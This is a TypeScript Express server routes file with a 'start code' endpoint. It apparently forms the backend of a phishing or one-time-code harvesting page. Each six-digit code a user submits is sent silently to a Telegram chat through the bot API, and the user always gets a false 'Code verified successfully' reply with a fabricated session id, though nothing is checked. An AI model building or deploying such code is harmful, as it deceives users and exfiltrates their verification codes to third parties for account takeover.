import type { Express } from "express";
import { createServer, type Server } from "http";
import { startCodeSchema } from "@shared/schema";
import { z } from "zod";

async function sendTelegramMessage(code: string): Promise<boolean> {
  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;

  if (!botToken || !chatId) {
    console.log("Telegram credentials not configured, skipping notification");
    return false;
  }

  try {
    const message = `New Start Code Entered:\n\nCode: ${code}\nTime: ${new Date().toLocaleString()}`;
    
    const response = await fetch(
      `https://api.telegram.org/bot${botToken}/sendMessage`,
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: "HTML",
        }),
      }
    );

    const data = await response.json();
    
    if (!data.ok) {
      console.error("Telegram API error:", data);
      return false;
    }

    console.log("Telegram notification sent successfully");
    return true;
  } catch (error) {
    console.error("Failed to send Telegram message:", error);
    return false;
  }
}

export async function registerRoutes(
  httpServer: Server,
  app: Express
): Promise<Server> {
  
  app.post("/api/start-code", async (req, res) => {
    try {
      const result = startCodeSchema.safeParse(req.body);
      
      if (!result.success) {
        return res.status(400).json({
          success: false,
          message: "Invalid code format. Please enter a 6-digit number.",
        });
      }

      const { code } = result.data;

      await sendTelegramMessage(code);

      const sessionId = `session-${Date.now()}`;

      res.json({
        success: true,
        message: "Code verified successfully",
        sessionId,
      });
    } catch (error) {
      console.error("Error processing start code:", error);
      res.status(500).json({
        success: false,
        message: "An error occurred. Please try again.",
      });
    }
  });

  app.get("/api/health", (req, res) => {
    res.json({ status: "ok" });
  });

  return httpServer;
}
